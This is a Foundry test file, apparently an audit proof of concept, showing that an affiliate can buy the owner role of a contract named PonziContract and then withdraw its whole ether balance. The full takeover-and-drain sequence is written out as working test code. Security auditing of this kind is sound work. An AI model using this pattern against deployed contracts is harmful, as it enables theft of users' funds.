// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.19;

import "forge-std/Test.sol";
import {PonziContract} from "../src/PonziContract/PonziContract.sol";

contract StealingOwnersRightsTest is Test {
    PonziContract ponziContract;
    address person1 = vm.addr(1);
    address owner = vm.addr(4);
    uint256 ETHER_TO_TRANSFER = 10 ether;

    function setUp() external {
        vm.startPrank(owner);
        ponziContract = new PonziContract();
        vm.stopPrank();
        vm.deal(address(person1), ETHER_TO_TRANSFER);
        vm.deal(address(ponziContract), ETHER_TO_TRANSFER);
    }

   function testBuyOwnerRole() public { // @audit risk of stealing owners rigths
        uint256 multiplier = 2;
        vm.startPrank(owner);
        ponziContract.addNewAffilliate(address(person1));
        assertEq(ponziContract.owner(), address(owner));
        assertEq(address(person1).balance, ETHER_TO_TRANSFER);

        changePrank(person1);
        // person1 buying contract owner position
        ponziContract.buyOwnerRole{value: ETHER_TO_TRANSFER}(address(person1));
        assertEq(ponziContract.owner(), address(person1));
        // person1 withdraw funds from contract.
        ponziContract.ownerWithdraw(address(person1), address(ponziContract).balance);
        assertEq(address(person1).balance, ETHER_TO_TRANSFER * multiplier);
        vm.stopPrank();
    }
}